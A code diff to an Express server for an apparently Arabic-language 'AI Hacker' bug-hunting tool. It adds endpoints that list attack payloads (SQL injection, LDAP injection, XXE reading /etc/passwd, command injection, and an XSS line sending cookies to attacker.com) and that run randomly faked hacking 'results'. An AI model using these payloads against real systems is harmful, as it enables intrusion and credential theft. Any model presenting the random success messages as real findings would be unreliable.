@@ -496,6 +496,26 @@ app.post('/api/ai-analyze', (req, res) => {
     );
 });
 
+// Delete report endpoint
+app.delete('/api/delete-report/:id', (req, res) => {
+    const reportId = req.params.id;
+    
+    if (!reportId) {
+        return res.status(400).json({ error: 'معرف التقرير مطلوب' });
+    }
+    
+    db.run(
+        `DELETE FROM commands WHERE id = ?`,
+        [reportId],
+        function (err) {
+            if (err) {
+                return res.status(500).json({ error: err.message });
+            }
+            res.json({ success: true, deletedRows: this.changes });
+        }
+    );
+});
+
 // Exploit generation endpoint
 app.post('/api/generate-exploit', (req, res) => {
     const { reportId, vulnerabilities } = req.body;
@@ -718,7 +738,213 @@ telnet target_ip port_number\n\n`;
     return exploit;
 }
 
+// AI Hacker endpoint
+app.post('/api/ai-hack', (req, res) => {
+    const { target, targetType, attackType } = req.body;
+
+    if (!target) {
+        return res.status(400).json({ error: 'الهدف مطلوب' });
+    }
+
+    const hackStrategy = generateHackStrategy(target, targetType, attackType);
+    
+    db.run(
+        `INSERT INTO commands (tool, command, output) VALUES (?, ?, ?)`,
+        ['AI-Hacker', `Hacking ${target}`, 'بدء عملية الاختراق الذكي...'],
+        function (err) {
+            if (err) {
+                return res.status(500).json({ error: err.message });
+            }
+            
+            executeAIHack(target, hackStrategy, this.lastID);
+            res.status(200).json({ 
+                message: 'بدء عملية الاختراق الذكي', 
+                id: this.lastID,
+                strategy: hackStrategy.name
+            });
+        }
+    );
+});
+
+// Generate payloads endpoint
+app.post('/api/generate-payloads', (req, res) => {
+    const { target, targetType, attackType } = req.body;
+    
+    const payloads = generateAttackPayloads(target, targetType, attackType);
+    res.json({ payloads });
+});
+
+// Execute payload endpoint
+app.post('/api/execute-payload', (req, res) => {
+    const { payload } = req.body;
+    
+    // Simulate payload execution (for educational purposes)
+    const result = simulatePayloadExecution(payload);
+    res.json({ result, success: Math.random() > 0.5 });
+});
+
+function generateHackStrategy(target, targetType, attackType) {
+    const strategies = {
+        network: {
+            name: 'Network Penetration',
+            phases: ['reconnaissance', 'scanning', 'enumeration', 'exploitation', 'post-exploitation'],
+            tools: ['nmap', 'masscan', 'metasploit', 'nessus']
+        },
+        webapp: {
+            name: 'Web Application Hacking',
+            phases: ['reconnaissance', 'directory-discovery', 'vulnerability-scanning', 'exploitation'],
+            tools: ['burp-suite', 'sqlmap', 'nikto', 'dirb']
+        },
+        api: {
+            name: 'API Security Testing',
+            phases: ['endpoint-discovery', 'authentication-bypass', 'injection-testing'],
+            tools: ['postman', 'burp-suite', 'sqlmap']
+        }
+    };
+    
+    return strategies[targetType] || strategies.network;
+}
+
+function executeAIHack(target, strategy, commandId) {
+    const hackCommands = generateHackCommands(target, strategy);
+    
+    let currentCommand = 0;
+    function runNextHackCommand() {
+        if (currentCommand >= hackCommands.length) {
+            updateCommandOutput(commandId, '\n🎯 انتهت عملية الاختراق الذكي');
+            return;
+        }
+
+        const cmd = hackCommands[currentCommand];
+        updateCommandOutput(commandId, `\n🔴 تنفيذ: ${cmd}\n`);
+        
+        // Simulate hack execution
+        setTimeout(() => {
+            const result = simulateHackResult(cmd);
+            updateCommandOutput(commandId, result);
+            currentCommand++;
+            setTimeout(runNextHackCommand, 3000);
+        }, 1000);
+    }
+    
+    runNextHackCommand();
+}
+
+function generateHackCommands(target, strategy) {
+    let commands = [];
+    
+    commands.push(`echo "🚨 AI HACKER ENGAGED - Target: ${target}"`);
+    commands.push(`echo "Strategy: ${strategy.name}"`);
+    commands.push('echo "========================================="');
+    
+    // Reconnaissance Phase
+    commands.push('echo "🔍 Phase 1: Reconnaissance"');
+    commands.push(`Gathering intelligence on ${target}`);
+    commands.push('WHOIS lookup and DNS enumeration');
+    commands.push('Social media reconnaissance');
+    commands.push('Email harvesting');
+    
+    // Scanning Phase
+    commands.push('echo "⚡ Phase 2: Active Scanning"');
+    commands.push('Port scanning with stealth techniques');
+    commands.push('Service version detection');
+    commands.push('OS fingerprinting');
+    commands.push('Vulnerability assessment');
+    
+    // Exploitation Phase
+    commands.push('echo "💀 Phase 3: Exploitation"');
+    commands.push('Exploiting identified vulnerabilities');
+    commands.push('Privilege escalation attempts');
+    commands.push('Lateral movement');
+    commands.push('Persistence mechanisms');
+    
+    // Post-Exploitation
+    commands.push('echo "👑 Phase 4: Post-Exploitation"');
+    commands.push('Data exfiltration');
+    commands.push('Installing backdoors');
+    commands.push('Covering tracks');
+    commands.push('Maintaining access');
+    
+    return commands;
+}
+
+function simulateHackResult(command) {
+    const results = [
+        '✅ Command executed successfully',
+        '⚠️ Partial success - some restrictions detected',
+        '❌ Failed - target protected',
+        '🎯 Vulnerability found and exploited',
+        '🔒 Access gained to restricted area',
+        '👤 User credentials harvested',
+        '💎 Sensitive data discovered',
+        '🚪 Backdoor installed successfully'
+    ];
+    
+    return results[Math.floor(Math.random() * results.length)];
+}
+
+function generateAttackPayloads(target, targetType, attackType) {
+    const payloads = [];
+    
+    // SQL Injection payloads
+    payloads.push({
+        type: 'SQL Injection',
+        code: "' OR '1'='1' --"
+    });
+    
+    payloads.push({
+        type: 'SQL Injection Union',
+        code: "' UNION SELECT username, password FROM users --"
+    });
+    
+    // XSS payloads
+    payloads.push({
+        type: 'XSS Basic',
+        code: "<script>alert('XSS')</script>"
+    });
+    
+    payloads.push({
+        type: 'XSS Advanced',
+        code: "<img src=x onerror=fetch('http://attacker.com?cookie='+document.cookie)>"
+    });
+    
+    // Command Injection
+    payloads.push({
+        type: 'Command Injection',
+        code: "; cat /etc/passwd"
+    });
+    
+    // LDAP Injection
+    payloads.push({
+        type: 'LDAP Injection',
+        code: "*)(uid=*))(|(uid=*"
+    });
+    
+    // XXE
+    payloads.push({
+        type: 'XXE',
+        code: '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>'
+    });
+    
+    return payloads;
+}
+
+function simulatePayloadExecution(payload) {
+    const responses = [
+        'Payload executed - SQL injection successful',
+        'XSS payload triggered - session hijacked',
+        'Command injection - shell access gained',
+        'Payload blocked by WAF',
+        'Authentication bypassed',
+        'Sensitive file accessed',
+        'Database dump completed'
+    ];
+    
+    return responses[Math.floor(Math.random() * responses.length)];
+}
+
 app.listen(port, '0.0.0.0', () => {
     console.log(`🚀 السيرفر شغال على http://0.0.0.0:${port}`);
     console.log(`🤖 AI-Powered Bug Hunter & Creator Ready`);
+    console.log(`🔴 AI Hacker Module Loaded`);
 });
